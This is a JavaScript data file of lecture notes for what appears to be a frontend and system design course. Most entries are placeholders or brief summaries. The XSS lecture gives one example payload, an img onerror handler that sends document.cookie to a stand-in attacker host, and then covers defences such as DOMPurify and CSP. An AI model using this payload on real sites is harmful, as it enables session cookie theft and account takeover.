const lectureNotesData = [
  {
    sectionId: "security",
    sectionTitle: "01 - Security",
    items: [
      {
        id: "01-01-web-security-introduction-fundamentals",
        title: "1.1 Web Security — Introduction & Fundamentals",
        summary: "Foundational frontend security principles, myths, and real-world examples.",
        instructor: "System Design",
        uploadDate: "June 2026",
        sectionTitle: "01 - Security",
        content: [
          {
            title: "Web Security — Introduction & Fundamentals",
            subTitle: "Core principles for frontend security",
            description: "# Web Security — Introduction & Fundamentals\n\n### 1. The Core Philosophy: Balancing UX & Security\n\n- **Critical Component:** Security is a non-negotiable aspect of software engineering, imperative for junior, senior, and lead developers alike.\n- **The UX Challenge:** Implementing robust security mechanisms must not degrade the User Experience (UX). High-level engineering requires creating a frictionless yet highly secure user journey.\n\n### 2. The Frontend Security Myth\n\n- **The Misconception:** A common industry myth among frontend engineers is that \*\"Security is solely a backend responsibility.\*\"\n- **The Reality:** The vast majority of cyber attacks originate or are initiated directly via the client-side (frontend). Because backend APIs implicitly trust the incoming requests from authenticated client applications, any compromise on the frontend can severely jeopardize the entire ecosystem.\n- **The Zero-Trust Model:** Never implicitly trust any user, even if they are authenticated, active session holders, or premium paid customers. Every client interaction should be treated with a defensive, security-first lens.\n\n### 3. Key Pillars of the Frontend Security Roadmap\nTo design architecture that safeguards client-side components, a frontend engineer must master the following core concepts:\n\n- **Network Security (HTTPS):** Ensuring all data in transit is encrypted over secure cryptographic protocols to mitigate network sniffing and man-in-the-middle (MITM) attacks.\n- **Input & Output Sanitization:** Strictly validating and escaping user inputs before parsing them into the document object model (DOM). Modern UI frameworks (like React) inherently handle text escaping, but vulnerabilities arise when raw execution entry points (e.g., `dangerouslySetInnerHTML`) are leveraged carelessly.\n- **Authentication vs. Authorization:** Distinctly managing who the user is (Authentication) and what exact permissions or resource scopes they have access to (Authorization). This prevents privilege escalation vulnerabilities, especially in unified dashboards handling multiple user roles (e.g., Admin vs. Standard User).\n- **Token Storage & Session Lifecycle:** Strategically choosing where to persist sensitive authorization tokens (Local Storage vs. Session Storage vs. Secure HttpOnly Cookies). It involves handling secure session expirations and ensuring absolute token invalidation during the client-side logout flows.\n- **Data Logging Standards (PII):** Strictly avoiding the practice of dumping Personally Identifiable Information (PII)—such as raw credentials, session tokens, or personal identifiers—into client storage, analytics pipelines, or unencrypted console/error logs.\n\n### 4. Real-World Case Studies & Architectural Audits\n\n- **B2B Contracts & Compliance (e.g., MoEngage):** Large enterprise clients, especially financial institutions and banks, do not sign vendor contracts until the frontend application passes rigorous vulnerability assessments, such as Cross-Site Scripting (XSS) checks and GDPR compliance testing.\n- **E-Commerce Gateways (e.g., Flipkart):** Integrating complex payment processors requires dedicated client-side audits to verify how session cookies, state validation, and transactional data loops are managed securely in the browser.\n- **Pre-IPO Corporate Audits (e.g., Uber):** When a major tech corporation prepares for an IPO, engineering teams undergo extensive, month-long audit trails. Third-party security firms strictly evaluate codebases and raise automated tracking tickets (e.g., Jira). Senior UI engineers are expected to deeply understand, defend, and optimize their code architecture against these vulnerabilities.\n- **Unvalidated File Upload Exploit:** If a client-side file uploader lacks definitive validations for file types, extensions, and binary sizes, malicious users can exploit it. For instance, uploading heavy media files (like movies) into unstructured image slots can instantly cause cloud storage costs to skyrocket."
          }
        ]
      },      {
        id: "01-02-security-overview",
        title: "1.2 Security Overview",
        summary: "Lecture on the security section introduction.",
        instructor: "System Design",
        uploadDate: "June 2026",
        sectionTitle: "01 - Security",
        content: [
          {
            title: "1.2 Security Overview",
            subTitle: "Section introduction",
            description: "Content placeholder for 1.2 security overview."
          }
        ]
      },
      {
        id: "01-03-cross-site-scripting-xss",
        title: "1.3 Cross-site Scripting (XSS)",
        summary: "Examines XSS attack methods, real-world risks, and concrete defenses for web apps.",
        instructor: "System Design",
        uploadDate: "June 2026",
        sectionTitle: "01 - Security",
        content: [
          {
            title: "What is XSS?",
            subTitle: "Attacker-controlled code runs in the browser",
            description: "XSS happens when the site takes data from outside and adds it to the page as HTML or JavaScript instead of plain text.\n\nFor example: the web address may contain `?name=<img src=x onerror=...>`. If the application reads that value and puts it into the page with innerHTML, the browser does not treat it as plain text. Instead, it creates an image element and runs the code inside `onerror`. That means the attacker’s code runs in the victim’s browser, using the victim’s current login session."
          },
          {
            title: "Example attack",
            subTitle: "Cookie theft using injected error handlers",
            description: "A payload like:\n- `<img src=x onerror=fetch('https://attacker/?c='+document.cookie)>`\nThis can send session cookies to the attacker silently."
          },
          {
            title: "Why it matters",
            subTitle: "Browser trust equals account risk",
            description: "Injected script runs with the site’s permissions, so it can: \n- read cookies \n- call page functions \n- submit forms \n- steal DOM content\n\nThe attacker can act as the user without backend login."
          },
          {
            title: "Other XSS risks",
            subTitle: "Unauthorized actions and data leakage",
            description: "XSS can also: \n- trigger unauthorized POST requests \n- capture keystrokes \n- inject fake login forms \n- exfiltrate page content such as bank balances and personal data."
          },
          {
            title: "Key defenses",
            subTitle: "Code-level protections",
            description: "Do not use innerHTML for untrusted input.\nUse textContent/innerText or safe framework binding.\nSanitize input with DOMPurify.\nEncode URL values with encodeURIComponent.\nAvoid eval and dangerouslySetInnerHTML."
          },
          {
            title: "CSP protection",
            subTitle: "Server-side script restrictions",
            description: "Content Security Policy can: \n- block untrusted external scripts \n- disallow inline script execution \n- prevent injected payloads from running even if they appear on the page."
          },
          {
            title: "Interview points",
            subTitle: "What to say in a security interview",
            description: "Q: What causes XSS?\nA: Untrusted input rendered as executable HTML/JS.\n\nQ: How is it prevented?\nA: Escape input, sanitize data, use text rendering, and enforce CSP.\n\nQ: Why avoid eval?\nA: It runs arbitrary code and allows injection."
          }
        ]
      },
      {
        id: "01-04-iframe-protection",
        title: "1.4 iFrame Protection",
        summary: "Preventing iFrame-based attacks.",
        instructor: "System Design",
        uploadDate: "June 2026",
        sectionTitle: "01 - Security",
        content: [
          {
            title: "1.4 iFrame Protection",
            subTitle: "iFrame security",
            description: "Content placeholder for 1.4 iFrame protection."
          }
        ]
      },
      {
        id: "01-05-security-headers",
        title: "1.5 Security Headers",
        summary: "Using HTTP security headers.",
        instructor: "System Design",
        uploadDate: "June 2026",
        sectionTitle: "01 - Security",
        content: [
          {
            title: "1.5 Security Headers",
            subTitle: "Headers and policies",
            description: "Content placeholder for 1.5 security headers."
          }
        ]
      },
      {
        id: "01-06-client-side-security",
        title: "1.6 Client-side Security",
        summary: "Frontend and browser security patterns.",
        instructor: "System Design",
        uploadDate: "June 2026",
        sectionTitle: "01 - Security",
        content: [
          {
            title: "1.6 Client-side Security",
            subTitle: "Browser-side defenses",
            description: "Content placeholder for 1.6 client-side security."
          }
        ]
      },
      {
        id: "01-07-secure-communication-https",
        title: "1.7 Secure Communication (HTTPS)",
        summary: "HTTPS and transport security.",
        instructor: "System Design",
        uploadDate: "June 2026",
        sectionTitle: "01 - Security",
        content: [
          {
            title: "1.7 Secure Communication (HTTPS)",
            subTitle: "Transport layer security",
            description: "Content placeholder for 1.7 secure communication."
          }
        ]
      },
      {
        id: "01-08-dependency-security",
        title: "1.8 Dependency Security",
        summary: "Third-party dependency safety.",
        instructor: "System Design",
        uploadDate: "June 2026",
        sectionTitle: "01 - Security",
        content: [
          {
            title: "1.8 Dependency Security",
            subTitle: "Supply chain protection",
            description: "Content placeholder for 1.8 dependency security."
          }
        ]
      },
      {
        id: "01-09-compliance-regulation",
        title: "1.9 Compliance & Regulation",
        summary: "Security compliance basics.",
        instructor: "System Design",
        uploadDate: "June 2026",
        sectionTitle: "01 - Security",
        content: [
          {
            title: "1.9 Compliance & Regulation",
            subTitle: "Policy and standards",
            description: "Content placeholder for 1.9 compliance and regulation."
          }
        ]
      },
      {
        id: "01-10-input-validation-and-sanitization",
        title: "1.10 Input Validation and Sanitization",
        summary: "Validating and sanitizing user input.",
        instructor: "System Design",
        uploadDate: "June 2026",
        sectionTitle: "01 - Security",
        content: [
          {
            title: "1.10 Input Validation and Sanitization",
            subTitle: "Secure input handling",
            description: "Content placeholder for 1.10 input validation and sanitization."
          }
        ]
      },
      {
        id: "01-11-ssrf",
        title: "1.11 Server-side Request Forgery (SSRF)",
        summary: "Preventing SSRF attacks.",
        instructor: "System Design",
        uploadDate: "June 2026",
        sectionTitle: "01 - Security",
        content: [
          {
            title: "1.11 Server-side Request Forgery (SSRF)",
            subTitle: "SSRF defense",
            description: "Content placeholder for 1.11 SSRF."
          }
        ]
      },
      {
        id: "01-12-server-side-javascript-injection",
        title: "1.12 Server-side JavaScript Injection",
        summary: "Protecting backend code execution.",
        instructor: "System Design",
        uploadDate: "June 2026",
        sectionTitle: "01 - Security",
        content: [
          {
            title: "1.12 Server-side JavaScript Injection",
            subTitle: "Backend injection protection",
            description: "Content placeholder for 1.12 server-side JavaScript injection."
          }
        ]
      },
      {
        id: "01-13-feature-policy-permissions-policy",
        title: "1.13 Feature Policy / Permissions-Policy",
        summary: "Browser feature restrictions.",
        instructor: "System Design",
        uploadDate: "June 2026",
        sectionTitle: "01 - Security",
        content: [
          {
            title: "1.13 Feature Policy / Permissions-Policy",
            subTitle: "Browser feature control",
            description: "Content placeholder for 1.13 feature policy and permissions-policy."
          }
        ]
      },
      {
        id: "01-14-subresource-integrity-sri",
        title: "1.14 Subresource Integrity (SRI)",
        summary: "Ensuring third-party script integrity.",
        instructor: "System Design",
        uploadDate: "June 2026",
        sectionTitle: "01 - Security",
        content: [
          {
            title: "1.14 Subresource Integrity (SRI)",
            subTitle: "Third-party script validation",
            description: "Content placeholder for 1.14 SRI."
          }
        ]
      },
      {
        id: "01-15-cors",
        title: "1.15 Cross-Origin Resource Sharing (CORS)",
        summary: "CORS configuration and rules.",
        instructor: "System Design",
        uploadDate: "June 2026",
        sectionTitle: "01 - Security",
        content: [
          {
            title: "1.15 Cross-Origin Resource Sharing (CORS)",
            subTitle: "Cross-origin policies",
            description: "Content placeholder for 1.15 CORS."
          }
        ]
      },
      {
        id: "01-16-csrf",
        title: "1.16 Cross-site Request Forgery (CSRF)",
        summary: "Protecting against CSRF attacks.",
        instructor: "System Design",
        uploadDate: "June 2026",
        sectionTitle: "01 - Security",
        content: [
          {
            title: "1.16 Cross-site Request Forgery (CSRF)",
            subTitle: "CSRF protection",
            description: "Content placeholder for 1.16 CSRF."
          }
        ]
      }
    ]
  },

  {
    sectionId: "networking",
    sectionTitle: "02 - Networking",
    items: [
      {
        id: "networking-overview",
        title: "Networking & Traffic",
        summary: "Load balancing, CDNs, DNS, and network security.",
        instructor: "Namaste System Design",
        uploadDate: "June 2026",
        sectionTitle: "02 - Networking",
        content: [
          {
            title: "Traffic Routing",
            subTitle: "Load balancers and DNS",
            description: "Design request flows, choose between L7 and L4 load balancers, and use DNS for routing and failover."
          },
          {
            title: "Content Delivery",
            subTitle: "CDNs and edge distribution",
            description: "Use CDNs to reduce latency, cache static assets, and improve global performance."
          },
          {
            title: "Network Security",
            subTitle: "Firewalls and secure boundaries",
            description: "Segment traffic with VPCs and firewalls to protect internal systems from external threats."
          }
        ]
      }
    ]
  },
  {
    sectionId: "testing",
    sectionTitle: "03 - Testing",
    items: [
      {
        id: "testing-overview",
        title: "Testing & Reliability",
        summary: "Verification strategy for system stability and correctness.",
        instructor: "Namaste System Design",
        uploadDate: "June 2026",
        sectionTitle: "03 - Testing",
        content: [
          {
            title: "Validation Strategy",
            subTitle: "Unit, integration, and end-to-end tests",
            description: "Define the testing pyramid and choose the right test types for each layer of your application."
          },
          {
            title: "Resilience Testing",
            subTitle: "Chaos engineering and fault injection",
            description: "Exercise failures intentionally to verify that the system recovers gracefully under real-world conditions."
          },
          {
            title: "Monitoring Test Coverage",
            subTitle: "Metrics and observability",
            description: "Track test health, flaky tests, and coverage to keep system reliability under control."
          }
        ]
      }
    ]
  },
  {
    sectionId: "communication",
    sectionTitle: "04 - Communication",
    items: [
      {
        id: "communication-overview",
        title: "Communication Patterns",
        summary: "APIs, pub/sub, messaging, and event-driven systems.",
        instructor: "Namaste System Design",
        uploadDate: "June 2026",
        sectionTitle: "04 - Communication",
        content: [
          {
            title: "Synchronous APIs",
            subTitle: "REST, GraphQL, and gRPC",
            description: "Choose the right request-response interface for your service interactions and client needs."
          },
          {
            title: "Asynchronous Messaging",
            subTitle: "Queues and event buses",
            description: "Use message-driven architecture to decouple systems and handle spikes gracefully."
          },
          {
            title: "Event-driven Design",
            subTitle: "Publish-subscribe systems",
            description: "Design event flows that keep services in sync without tight coupling."
          }
        ]
      }
    ]
  },
  {
    sectionId: "database-caching",
    sectionTitle: "05 - Database and Caching",
    items: [
      {
        id: "database-caching-overview",
        title: "Database & Caching",
        summary: "Storage systems, indexes, and cache patterns for performance.",
        instructor: "Namaste System Design",
        uploadDate: "June 2026",
        sectionTitle: "05 - Database and Caching",
        content: [
          {
            title: "Storage Models",
            subTitle: "SQL vs NoSQL",
            description: "Compare relational and document models to choose the best fit for your data access patterns."
          },
          {
            title: "Caching Strategies",
            subTitle: "Read-through, write-through, and TTL",
            description: "Use cache layers to reduce load on databases and speed up frequent reads."
          },
          {
            title: "Scaling Storage",
            subTitle: "Partitioning and replication",
            description: "Design data scaling with sharding, replication, and strong/weak consistency tradeoffs."
          }
        ]
      }
    ]
  },
  {
    sectionId: "logging-monitoring",
    sectionTitle: "06 - Logging and Monitoring",
    items: [
      {
        id: "logging-monitoring-overview",
        title: "Logging & Monitoring",
        summary: "Observability for operations and incident response.",
        instructor: "Namaste System Design",
        uploadDate: "June 2026",
        sectionTitle: "06 - Logging and Monitoring",
        content: [
          {
            title: "Logging Best Practices",
            subTitle: "Structured logs and error tracking",
            description: "Capture meaningful logs that make incident diagnosis fast and accurate."
          },
          {
            title: "Monitoring Metrics",
            subTitle: "System health and SLIs",
            description: "Track latency, throughput, errors, and saturation to keep systems within service levels."
          },
          {
            title: "Alerting & Incident Response",
            subTitle: "Notifications and runbooks",
            description: "Set up alerts that matter and prepare teams with clear incident playbooks."
          }
        ]
      }
    ]
  },
  {
    sectionId: "performance",
    sectionTitle: "07 - Performance",
    items: [
      {
        id: "performance-overview",
        title: "Performance Optimization",
        summary: "Latency, throughput, and efficient system design.",
        instructor: "Namaste System Design",
        uploadDate: "June 2026",
        sectionTitle: "07 - Performance",
        content: [
          {
            title: "Latency Reduction",
            subTitle: "Faster response times",
            description: "Optimize service chains, reduce round trips, and cache smartly to lower latency."
          },
          {
            title: "Throughput Scaling",
            subTitle: "Handling more requests",
            description: "Design horizontal scaling and backpressure mechanisms for high throughput systems."
          },
          {
            title: "Performance Budgets",
            subTitle: "Setting targets and goals",
            description: "Use measurable performance budgets to keep designs efficient and user-friendly."
          }
        ]
      }
    ]
  },
  {
    sectionId: "accessibility",
    sectionTitle: "08 - Accessibility",
    items: [
      {
        id: "accessibility-overview",
        title: "Accessibility & UX",
        summary: "Design systems that are usable, inclusive, and accessible.",
        instructor: "Namaste System Design",
        uploadDate: "June 2026",
        sectionTitle: "08 - Accessibility",
        content: [
          {
            title: "Inclusive Design",
            subTitle: "Accessible experiences for all users",
            description: "Build interfaces and APIs that are intuitive and easy to use across devices and abilities."
          },
          {
            title: "Performance Accessibility",
            subTitle: "Fast and responsive systems",
            description: "Improve accessibility through faster page loads and predictable interactions."
          },
          {
            title: "Error Handling",
            subTitle: "Clear feedback and recoverability",
            description: "Make system failures understandable and easy for users to recover from."
          }
        ]
      }
    ]
  },
  {
    sectionId: "low-level-design",
    sectionTitle: "09 - Low level design",
    items: [
      {
        id: "low-level-design-overview",
        title: "Low Level Design",
        summary: "Class diagrams, components, and data structures.",
        instructor: "Namaste System Design",
        uploadDate: "June 2026",
        sectionTitle: "09 - Low level design",
        content: [
          {
            title: "Component Design",
            subTitle: "Modules and interfaces",
            description: "Define clear component responsibilities and interfaces for maintainable systems."
          },
          {
            title: "Data Structures",
            subTitle: "Choosing the right storage model",
            description: "Select efficient data structures and algorithms to meet system requirements."
          },
          {
            title: "Design Patterns",
            subTitle: "Reusable software solutions",
            description: "Apply patterns like factory, singleton, and strategy to solve common architecture problems."
          }
        ]
      }
    ]
  },
  {
    sectionId: "high-level-design",
    sectionTitle: "10 - High Level Design",
    items: [
      {
        id: "high-level-design-overview",
        title: "High Level Design",
        summary: "System architecture, scaling, and end-to-end flows.",
        instructor: "Namaste System Design",
        uploadDate: "June 2026",
        sectionTitle: "10 - High Level Design",
        content: [
          {
            title: "Architecture Patterns",
            subTitle: "Monoliths vs microservices",
            description: "Compare architectural styles and choose the best fit for reliability and team structure."
          },
          {
            title: "Data Flow",
            subTitle: "Request and event lifecycle",
            description: "Map how data moves through systems from user action to backend processing."
          },
          {
            title: "Scalability Strategy",
            subTitle: "Designing for growth",
            description: "Use sharding, replication, and autoscaling to ensure the system stays performant as demand increases."
          }
        ]
      }
    ]
  },
  {
    sectionId: "masterclass",
    sectionTitle: "11 - Bonus Masterclass",
    items: [
      {
        id: "masterclass-overview",
        title: "Bonus Masterclass",
        summary: "Advanced system design concepts and real-world case studies.",
        instructor: "Namaste System Design",
        uploadDate: "June 2026",
        sectionTitle: "11 - Bonus Masterclass",
        content: [
          {
            title: "Design Tradeoffs",
            subTitle: "Balancing cost, speed, and reliability",
            description: "Understand the practical compromises needed when designing production systems."
          },
          {
            title: "Architecture Reviews",
            subTitle: "Evaluating design decisions",
            description: "Use review frameworks to spot risks and improve architectural quality."
          },
          {
            title: "Case Studies",
            subTitle: "Real system design examples",
            description: "Learn from how popular systems were built and why certain architecture choices were made."
          }
        ]
      }
    ]
  },
  {
    sectionId: "interview-questions",
    sectionTitle: "12 - Bonus Interview Questions",
    items: [
      {
        id: "interview-questions-overview",
        title: "Interview Question Bank",
        summary: "Common system design questions and answer strategies.",
        instructor: "Namaste System Design",
        uploadDate: "June 2026",
        sectionTitle: "12 - Bonus Interview Questions",
        content: [
          {
            title: "Design Questions",
            subTitle: "How to approach system prompts",
            description: "Practice structuring answers, asking clarifying questions, and selecting the right architecture for interview problems."
          },
          {
            title: "Tradeoff Discussion",
            subTitle: "Explaining decisions clearly",
            description: "Learn how to explain latency, consistency, and availability tradeoffs during a system design interview."
          },
          {
            title: "Mock Scenarios",
            subTitle: "Sample problems and frameworks",
            description: "Review common system design scenarios and the frameworks you can use to solve them quickly."
          }
        ]
      }
    ]
  }
];

export default lectureNotesData;
